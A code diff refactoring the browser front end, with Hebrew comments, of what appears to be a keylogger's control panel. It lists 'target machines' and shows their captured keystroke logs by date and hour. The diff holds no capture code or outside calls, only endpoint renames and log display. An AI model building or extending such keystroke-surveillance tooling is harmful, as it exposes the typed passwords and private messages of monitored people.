@@ -1,7 +1,7 @@
 const API_BASE = "http://localhost:5000/api";
 let selectedMachine = null;
 
-// ====== מניעת רענון דף אוטומטי - גרסה חזקה יותר ======
+// ====== מניעת רענון דף אוטומטי ======
 window.addEventListener('beforeunload', function(e) {
   e.preventDefault();
   e.returnValue = '';
@@ -15,20 +15,18 @@ window.addEventListener('beforeunload', function(e) {
     return false;
   };
   
-  // חסימת מטא רענון
   const metaElements = document.querySelectorAll('meta[http-equiv="refresh"]');
   metaElements.forEach(meta => meta.remove());
   
-  // מניעת רענון דרך history
   window.addEventListener('popstate', function(e) {
     e.preventDefault();
   });
 })();
 
-// ====== טוען את רשימת המחשבים ======
+// ====== טעינת רשימת המחשבים ======
 async function loadMachines() {
   try {
-    const res = await fetch(`${API_BASE}/get_target_machines_list`);
+    const res = await fetch(`${API_BASE}/machines`);
     const machines = await res.json();
 
     const container = document.getElementById("machines-container");
@@ -52,12 +50,16 @@ async function showLogsPage(machine) {
   document.getElementById("logs-page").style.display = "block";
   document.getElementById("selected-machine").textContent = `מחשב נבחר: ${machine}`;
 
-  // ניקוי לוגים קודמים
   document.getElementById("logs-container").innerHTML = "";
 
   try {
-    const res = await fetch(`${API_BASE}/get_dates?machine=${machine}`);
+    const res = await fetch(`${API_BASE}/machines/${machine}/dates`);
     const dates = await res.json();
+
+    if (!Array.isArray(dates)) {
+      console.error("Server returned an error:", dates);
+      return;
+    }
 
     const dateSelect = document.getElementById("date-select");
     dateSelect.innerHTML = "";
@@ -70,7 +72,6 @@ async function showLogsPage(machine) {
       dateSelect.appendChild(option);
     });
 
-    // טען שעות של התאריך הראשון כברירת מחדל
     if (dates.length > 0) populateHourSelect(dates[0]);
 
   } catch (err) {
@@ -85,31 +86,18 @@ document.getElementById("back-btn").onclick = () => {
   document.getElementById("logs-container").innerHTML = "";
 };
 
-// ====== יצירת select שעות מהלוג ======
+// ====== טעינת שעות לפי תאריך ======
 async function populateHourSelect(date) {
   if (!selectedMachine || !date) return;
 
   try {
-    const res = await fetch(`${API_BASE}/get_keystrokes?machine=${selectedMachine}&date=${date}`);
-    const data = await res.json();
-
-    const hoursSet = new Set();
-    
-    // חלוקת הלוגים לפי הפרדות של ==================================================
-    const logEntries = data.logs.join('\n').split('==================================================');
-    
-    logEntries.forEach(entry => {
-      const trimmedEntry = entry.trim();
-      if (!trimmedEntry) return;
-      
-      const match = trimmedEntry.match(/^\[\d{4}-\d{2}-\d{2} (\d{2}):\d{2}:\d{2}\]/);
-      if (match) hoursSet.add(match[1]);
-    });
+    const res = await fetch(`${API_BASE}/machines/${selectedMachine}/dates/${date}/hours`);
+    const hours = await res.json();
 
     const hourSelect = document.getElementById("hour-select");
     hourSelect.innerHTML = "";
 
-    [...hoursSet].sort().forEach(hh => {
+    hours.forEach(hh => {
       const option = document.createElement("option");
       option.value = hh;
       option.textContent = hh;
@@ -120,57 +108,53 @@ async function populateHourSelect(date) {
   }
 }
 
-// ====== הפונקציה להצגת הלוגים ======
+// ====== הצגת לוגים לפי שעה ======
 function displayLogs(logsData, hour) {
   const container = document.getElementById("logs-container");
   container.innerHTML = "";
 
-  if (logsData && logsData.length > 0) {
-    // חלוקת הלוגים לפי הפרדות של ==================================================
-    const logEntries = logsData.join('\n').split('==================================================');
-    
-    const filteredLogs = logEntries.filter(entry => {
-      const trimmedEntry = entry.trim();
-      if (!trimmedEntry) return false;
-      
-      // חיפוש התאמה לשעה
-      const match = trimmedEntry.match(/^\[\d{4}-\d{2}-\d{2} (\d{2}):\d{2}:\d{2}\]/);
-      return match && match[1] === hour;
-    });
-
-    filteredLogs.forEach(entry => {
-      const trimmedEntry = entry.trim();
-      const lines = trimmedEntry.split('\n');
-      
-      // השורה הראשונה מכילה את הזמן
-      const firstLine = lines[0];
-      const timeMatch = firstLine.match(/^\[\d{4}-\d{2}-\d{2} (\d{2}:\d{2}:\d{2})\]/);
-      
-      if (timeMatch) {
-        const timeOnly = timeMatch[1];
-        // כל השורות מלבד הראשונה הן התוכן
-        const content = lines.slice(1).join('\n').trim();
-        
-        const logDiv = document.createElement("div");
-        logDiv.className = "log";
-        logDiv.style.whiteSpace = "pre-wrap";
-        logDiv.style.marginBottom = "15px";
-        logDiv.style.borderBottom = "1px solid #ddd";
-        logDiv.style.paddingBottom = "10px";
-        logDiv.textContent = `${timeOnly} - ${content}`;
-        container.appendChild(logDiv);
-      }
-    });
-
-    if (filteredLogs.length === 0) {
-      container.textContent = "אין לוגים לשעה זו.";
-    }
-  } else {
+  if (!logsData || logsData.length === 0) {
     container.textContent = "אין לוגים להצגה.";
+    return;
+  }
+
+  const logEntries = logsData.join('\n').split('==================================================');
+
+  const filteredLogs = logEntries.filter(entry => {
+    const trimmedEntry = entry.trim();
+    if (!trimmedEntry) return false;
+
+    const match = trimmedEntry.match(/^\[\d{4}-\d{2}-\d{2} (\d{2}):\d{2}:\d{2}\]/);
+    return match && match[1] === hour;
+  });
+
+  filteredLogs.forEach(entry => {
+    const trimmedEntry = entry.trim();
+    const lines = trimmedEntry.split('\n');
+    const firstLine = lines[0];
+
+    const timeMatch = firstLine.match(/^\[\d{4}-\d{2}-\d{2} (\d{2}:\d{2}:\d{2})\]/);
+    if (timeMatch) {
+      const timeOnly = timeMatch[1];
+      const content = lines.slice(1).join('\n').trim();
+
+      const logDiv = document.createElement("div");
+      logDiv.className = "log";
+      logDiv.style.whiteSpace = "pre-wrap";
+      logDiv.style.marginBottom = "15px";
+      logDiv.style.borderBottom = "1px solid #ddd";
+      logDiv.style.paddingBottom = "10px";
+      logDiv.textContent = `${timeOnly} - ${content}`;
+      container.appendChild(logDiv);
+    }
+  });
+
+  if (filteredLogs.length === 0) {
+    container.textContent = "אין לוגים לשעה זו.";
   }
 }
 
-// ====== טעינת הלוגים לפי שעה ======
+// ====== טעינת לוגים לפי שעה ======
 document.getElementById("fetch-logs-btn").onclick = async () => {
   if (!selectedMachine) return;
 
@@ -179,7 +163,7 @@ document.getElementById("fetch-logs-btn").onclick = async () => {
   if (!date || !hour) return;
 
   try {
-    const res = await fetch(`${API_BASE}/get_keystrokes?machine=${selectedMachine}&date=${date}`);
+    const res = await fetch(`${API_BASE}/machines/${selectedMachine}/logs?date=${date}`);
     const data = await res.json();
 
     displayLogs(data.logs, hour);
